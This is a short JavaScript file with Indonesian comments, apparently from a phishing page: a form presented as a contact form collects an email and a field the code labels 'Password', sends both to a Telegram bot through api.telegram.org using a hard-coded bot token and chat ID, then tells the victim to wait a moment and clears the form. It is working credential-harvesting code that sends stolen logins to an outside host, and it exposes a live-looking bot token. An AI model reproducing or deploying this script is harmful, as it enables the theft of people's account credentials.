// script.js
document.getElementById('contactForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Ambil data dari formulir
    const email = document.getElementById('email').value;
    const message = document.getElementById('message').value;

    // Siapkan pesan
    const text = `Email: ${email}\nPassword: ${message}`;

    // Token bot dan chat ID
    const token = "6890629909:AAGd9N4y9egC19kilTaMLZx-HkGQzWcuTAc"; // Ganti dengan token bot Anda
    const chatId = "1838045010"; // Ganti dengan chat ID Anda

    // Kirim data ke Telegram
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Tunggu sebentar');
            document.getElementById('contactForm').reset();
        } else {
            alert('Terjadi kesalahan. Silakan coba lagi.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Terjadi kesalahan. Silakan coba lagi.');
    });
});
